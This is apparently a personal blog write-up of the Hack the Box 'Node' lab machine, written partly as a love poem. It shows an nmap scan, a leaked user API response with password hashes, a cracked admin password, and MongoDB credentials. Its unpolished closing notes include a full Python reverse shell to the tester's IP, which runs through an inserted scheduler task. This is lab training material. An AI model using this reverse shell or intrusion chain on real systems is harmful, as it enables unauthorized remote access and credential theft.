---
layout: post
title:  "Hack the Box - Node"
date:   2018-03-07 16:16:01 -0600
categories: hackthebox nosql webapp reversing mongo mongodb hacking writeup
---

<img class="header-img" src="{{ "img/node/home.png" | relative_url }}" />

Node was a special box to me. It was a special box because it was my first "first blood", and it got me truely addicted to (https://hackthebox.eu)[hackthebox]. In light of this, I'm going mix things up and bit and make the following writeup a love note to Node:

Oh, Node,
it has been some time since we last spoke.
It's been a while since my sweet TCP packets,
probed your open ports.

{% highlight shell %}
root@hack ~# nmap -p- -T4 node.htb
{% endhighlight %}

You rebuffed my attempts on 80. On 8080, 443, and more.
But you invited me into your space, into yourplace, into port 3000.
Yes, you did.

I dug into your deepest secrets.
And into the APIs which b(urp)equeathed your user sequence.
I saw you clearly, inside and out; cut through your defences:
turned `/api/users/latest` to `/api/users` and saw your sweet response:

{% highlight shell %}
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 611
ETag: W/"263-mJMXKDfX6c4pdWF3bLjHuBIvsM0"
Date: Wed, 07 Mar 2018 13:51:16 GMT
Connection: close

[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
{% endhighlight %}

You past lovers? I cared not.
But an `admin` flag, is an `admin` flag, and must always be followed. Its hash looked weak.
Indeed, it was. (https://crackstation.net)[Crackstation] revealed it secret was
"manchester".


download back up
base64 decode into zip
unzip, need password
password via john - secret word
backup_key = 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
mark password for mongo: 5AYRft73VtFpc84k and ssh
/var/scheduler/app.js > runs mongo tasks
db.auth("mark","5AYRft73VtFpc84k")
insert tasks to print flag
FIRST BLOOD BABY
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.10.14.22',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
use scheduler to run
db.tasks.insert({"_id":"1","cmd":"python /tmp/over/over.py"})
get shell
reverse backup to see that it blacklists characters and needs a key
run from / and backup /root
get key
win


_fin_
